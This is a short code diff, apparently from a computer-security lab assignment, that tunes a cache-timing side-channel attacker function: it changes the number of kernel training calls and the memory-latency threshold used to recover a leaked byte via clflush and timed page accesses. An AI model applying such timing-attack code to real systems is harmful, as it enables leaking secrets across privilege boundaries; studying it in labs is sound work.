@@ -70,7 +70,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         while (repeat)
         {
-            for (same_twice = 0; same_twice < 10; same_twice++) {
+            for (same_twice = 0; same_twice < 5; same_twice++) {
                 call_kernel_part2(kernel_fd, shared_memory, 0);
             }
 
@@ -90,7 +90,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 4096) {
                 dram_latency = time_access((void*)(shared_memory+flush_offset));
                 clflush((void*)(shared_memory+flush_offset));
-                if (dram_latency < 90){
+                if (dram_latency < 70){
                     leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
                     repeat = 0;
                 }
